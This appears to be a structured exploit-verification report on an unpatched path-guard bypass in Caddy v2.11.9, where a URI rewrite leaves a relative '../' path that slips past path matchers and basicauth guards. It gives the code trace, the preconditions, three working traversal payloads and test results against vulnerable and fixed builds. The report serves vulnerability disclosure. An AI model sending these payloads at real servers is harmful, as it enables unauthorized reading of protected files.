trace.code: substrReplacer.do (uri replace /mount ''): changePath(r, func(p){ strings.Replace(CleanPath(p, mergeSlashes), find, replace, lim) }) — the resulting path is set verbatim; there is NO canonicalizePath afterwards (unlike StripPathPrefix/StripPathSuffix, which call canonicalizePath at lines 297/311).
changePath: r.URL.Path = url.PathUnescape(substituted EscapedPath). For GET /mount../secret/flag.txt this yields the RELATIVE path '../secret/flag.txt' (no leading slash, '..' kept).

MatchPath.MatchWithError: reqPathForPattern = CleanPath(r.URL.Path) = path.Clean('../secret/flag.txt') = '../secret/flag.txt' (path.Clean keeps a leading '..' on a RELATIVE path). Pattern '/secret/*' does not match -> the @blocked path /secret/* guard does NOT fire.
SanitizedPathJoin(root, '../secret/flag.txt') = path.Clean('/' + reqPath) = path.Clean('/../secret/flag.txt') = '/secret/flag.txt' -> file_server serves root/secret/flag.txt (the guard never ran).

fix fc6c202ea6: oldPath := r.URL.Path; changePath(...); if r.URL.Path != oldPath { canonicalizePath(r) }. canonicalizePath anchors '../secret/flag.txt' to '/secret/flag.txt', so the path matcher now matches and the guard blocks.

preconditions: Caddy v2.11.9 (or earlier) serving static files with file_server
A rewrite directive using uri_substring (`uri replace <find>`) or path_regexp (`uri path_regexp <find> <replace>`) that strips/rewrites a path prefix, placed BEFORE the guard in the handler chain
A path-based access guard on a sensitive subdirectory (e.g. `@blocked path /secret/*` + `respond 403`, or `basicauth`) placed after the rewrite
Attacker can send arbitrary HTTP requests (unauthenticated)

evidence.fixed_version: unreleased (master @ fc6c202ea6, 2026-11-10; no public release as of 2026-11-12)
evidence.observed_result: Real Caddy v2.11.9 binary (built from cmd/caddy): GET /secret/flag.txt -> 403 (guard fires normally), GET /public/hello.txt -> 200 (control). The three traversal payloads /mount../secret/flag.txt, /mount..%2fsecret/flag.txt and /mount%2e%2e/secret/flag.txt each return 200 with SECRET-FLAG{CaddyWormhole-path-guard-bypass} (3/3 bypass). The same requests against fixed master (fc6c202ea6) return 403 (3/3 blocked), while /public/hello.txt still returns 200.

real_exploit.target: github.com/caddyserver/caddy v2.11.9 (commit 0d98caea58f794f88e709b1bef2880996a471bca) — the real cmd/caddy binary built from source, running the real http.handlers.rewrite (uri_substring), http.matchers.path, http.handlers.static_response and http.handlers.file_server modules
real_exploit.backend: the real Caddy HTTP server (file_server) serving a staged filesystem whose /secret/flag.txt is protected by a `@blocked path /secret/*` + `respond 403` guard, with a preceding `uri replace /mount ""` rewrite
real_exploit.demonstrated: The real vulnerable Caddy serves the guarded /secret/flag.txt (HTTP 200 + secret body) for all three traversal payloads while correctly returning 403 for the direct /secret/flag.txt; the real fixed Caddy returns 403 for the same traversal payloads. Differential vuln-vs-fixed on the actual binaries, exit 0.

evidence.notes: No public CVE/GHSA as of 2026-11-12 — the fixes (fc6c202ea6, 7593fd002f, f4c634f0ed, 7591cff1fb, 3c65959560, c3fab6576f, ebfc03a7b6, 13d000e010) landed on master 2026-11-10/11 and postdate the latest release v2.11.9, so v2.11.9 is 0-day-vulnerable. The traversal is confined to the served root (SanitizedPathJoin still anchors to root), so impact is unauthorized read of any file inside the root that a path guard/basicauth was meant to protect — not arbitrary filesystem read.
